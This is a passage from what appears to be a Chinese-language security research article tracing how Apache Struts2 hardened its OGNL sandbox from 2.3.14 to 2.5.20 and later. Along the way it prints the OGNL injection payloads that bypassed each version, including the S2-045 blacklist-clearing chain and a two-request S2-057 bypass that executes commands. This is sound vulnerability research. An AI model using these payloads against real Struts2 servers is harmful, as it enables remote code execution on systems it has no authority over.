以下图例左边都是较为新的版本，右边为老版本。
### 3.1 Struts 2.3.14.1版本前
S2-012、S2-013、S3-014的出现促使了这次更新，可以说在跟新到2.3.14.1版本前，ognl的利用基本属于不设防状态，我们可以看一下这两个版本的diff，不难发现当时还没有出现黑名单这样的说法，而修复的关键在于`SecurityMemberAccess`：
左边是2.3.14.1的版本，右边是2.3.14的版本，不难看出在这之前可以通过ognl直接更改`allowStaticMethodAccess=true`，就可以执行后面的静态方法了，所以当时非常通用的一种poc是：
    (#_memberAccess['allowStaticMethodAccess']=true).(@java.lang.Runtime@getRuntime().exec('calc'))
而在2.3.14.1版本后将`allowStaticMethodAccess`设置成final属性后，就不能显式更改了，这样的poc显然也失效了。
### 3.2 Struts 2.3.20版本前
在2.3.14.1后虽然不能更改`allowStaticMethodAccess`了，但是还是可以通过`_memberAccess`使用类的构造函数，并且访问公共函数，所以可以看到当时有一种替代的poc：
    (#p=new java.lang.ProcessBuilder('xcalc')).(#p.start())
直到2.3.20，这样的poc都可以直接使用。在2.3.20后，Struts2不仅仅引入了黑名单（excludedClasses,
excludedPackageNames 和
excludedPackageNamePatterns），更加重要的是阻止了所有构造函数的使用，所以就不能使用`ProcessBuilder`这个payload了。
### 3.3 Struts 2.3.29版本前
左为2.3.29版本，右边为2.3.28版本
从黑名单中可以看到禁止使用了`ognl.MemberAccess`和`ognl.DefaultMemberAccess`，而这两个对象其实就是2.3.20-2.3.28版本的通用绕过方法，具体的思路就是利用`_memberAccess`调用静态对象`DefaultMemberAccess`，然后用`DefaultMemberAccess`覆盖`_memberAccess`。那么为什么说这样就可以使用静态方法了呢？
我们先来看一下可以在S2-032、S2-033、S2-037通用的poc：
    (#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('xcalc'))
我们来看一下`ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`：
看过上一节的都知道，在程序运行时在`setOgnlUtil`方法中将黑名单等数据赋给`SecurityMemberAccess`，而这就是创建`_memberAccess`的过程，在动态调试中，我们可以看到这两个对象的id甚至都是一样的，而`SecurityAccess`这个对象的父类本身就是`ognl.DefaultMemberAccess`，而其建立关系的过程就相当于继承父类并重写父类的过程，所以这里我们利用其父类`DefaultMemberAccess`覆盖`_memberAccess`中的内容，就相当于初始化了`_memberAccess`，这样就可以绕过其之前所设置的黑名单以及限制条件。
### 3.4 Struts 2.3.30+/2.5.2+
到了2.3.30(2.5.2)之后的版本，我们可以使用的`_memberAccess`和`DefaultMemberAccess`都进入到黑名单中了，覆盖的方法看似就不行了，而这个时候S2-045的payload提供了一种新的思路：
    (#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('xcalc'))
可以看到绕过的关键点在于：
  * 利用Ognl执行流程利用`container`获取了`OgnlUtil`实例
  * 清空了`OgnlUtil$excludedClasses`黑名单，释放了`DefaultMemberAccess`
  * 利用`setMemberAccess`覆盖
而具体的流程可以参考2.2的内容。
### 3.5 Struts 2.5.16
分析过S2-057后，你会发现ognl注入很容易复现，但是想要调用静态方法造成代码执行变得很难，我们来看一下Struts2又做了哪些改动：
  * 2.5.13版本后禁止访问`coontext.map`
准确来说是ognl包版本的区别，在2.5.13中利用的是3.1.15版本，在2.5.12版本中使用的是3.1.12版本：
而这个改变是在`OgnlContext`中：
不只是get方法，put和remove都没有办法访问了，所以说从根本上禁止了对`context.map`的访问。
  * 2.5.20版本后`excludedClasses`不可变了，具体的代码在[这里](https://github.com/apache/struts/commit/748da3f8ce6b9f3953bc418745c35a534e5b98ca)
所以在S2-045时可使用的payload已经没有办法再使用了，需要构造新的利用方式。
文章提出了这么一种思路:
  * 没有办法使用`context.map`，可以调用`attr`，前文说过`attr`中保存着整个`context`的变量与方法，可以通过`attr`中的方法返回给我们一个`context.map`。
  * 没有办法直接调用`excludedClasses`，也就不能使用`clear`方法来清空，但是还可以利用`setter`来把`excludedClasses`给设置成空
  * 清空了黑名单，我们就可以利用`DefaultMemberAccess`来覆盖`_memberAccess`，来执行静态方法了。
而这里又会出现一个问题，当我们使用`OgnlUtil`的`setExcludedClasses`和`setExcludedPackageNames`将黑名单置空时并非是对于源（全局的OgnlUtil）进行置空，也就是说`_memberAccess`是源数据的一个引用，就像前文所说的，在每次`createAction`时都是通过`setOgnlUtil`利用全局的源数据创建一个引用，这个引用就是一个`MemberAccess`对象，也就是`_memberAccess`。所以这里只会影响这次请求的`OgnlUtil`而并未重新创建一个新的`_memberAccess`对象，所以旧的`_memberAccess`对象仍未改变。
而突破这种限制的方式就是再次发送一个请求，将上一次请求已经置空的`OgnlUitl`作为源重新创建一个`_memberAccess`，这样在第二次请求中`_memberAccess`就是黑名单被置空的情况，这个时候就释放了`DefaultMemberAccess`，就可以进行正常的覆盖以及执行静态方法。
poc为：
    (#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))
    (#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('curl 127.0.0.1:9001'))
需要发送两次请求：
## 0x04 现阶段的OGNL
Struts2在
2.5.16版本后做了很多修改，截止到写文章的时候，已经更新到2.5.20，接下来我将把这几个版本的区别全部都列出来，并且说明现在绕过Ognl沙箱面临着哪些阻碍。同上一节，左边都为较新的版本，右边为较旧的版本。
### 4.1 2.5.17的改变（限制命名空间）
  1. 黑名单的变动，禁止访问`com.opensymphony.xwork2.ognl.`
讲道理，2.5.17版本的修补真的是很暴力，直接在黑名单中加上了`com.opensymphony.xwork2.ognl.`也就是说我们根本没办法访问这个Struts2重写的ognl包了。
  2. 切断了动态引用的方式，需要利用构造函数生成
不谈重写了`setExcludedClasses`和`setExcludedPackageNamePatterns`，单单黑名单的改进就极大的限制了利用。
### 4.2 2.5.19的改进
  1. ognl包的升级，从3.1.15升级到3.1.21
  2. 黑名单改进
![
](https://images.seebug.org/content/images/2019/01/bbda1811-da46-4231-98ee-6bad994e227e.jpg-w331s)
  3. 在`OgnlUtil`中`setXWorkConverter`、`setDevMode`、`setEnableExpressionCache`、`setEnableEvalExpression`、`setExcludedClasses`、`setExcludedPackageNamePatterns`、`setExcludedPackageNames`、`setContainer`、`setAllowStaticMethodAccess`、`setDisallowProxyMemberAccess`都从public方法变成了protected方法了：
也就是说没有办法显式调用`setExcludedClasses`、`setExcludedPackageNamePatterns`、`setExcludedPackageNames`了。
### 4.3 master分支的改变
  1. ognl包的升级，从3.1.21升级到3.2.10，直接删除了`DefaultMemberAccess.java`，同时删除了静态变量`DEFAULT_MEMBER_ACCESS`，并且`_memberAccess`变成了final：
  2. `SecurityMemberAccess`不再继承`DefaultMemberAccess`而直接转为`MemberAccess`接口的实现：
可以看到Struts2.5.*基本上是对Ognl的执行做出了重大的改变，`DefaultAccess`彻底退出了历史舞台意味着利用父类覆盖`_memberAccess`的利用方式已经无法使用，而黑名单对于`com.opensymphony.xwork2.ognl`的限制导致我们基本上没有办法利用`Ognl`本身的API来更改黑名单，同时`_memberAccess`变为final属性也使得S2-057的这种利用`_memberAccess`暂时性的特征而进行“重放攻击”的方式测地化为泡影。
### 4.4 总结
Struts2随着其不断地发展，减少了原来框架的一部分灵活性而大大的增强了其安全性，如果按照master分支的改动趋势上看，以我的理解上来说，可以说现在基本上没得搞…
## 0x05 Reference
  * 
  * 
  * 《Struts2技术内幕》
* * *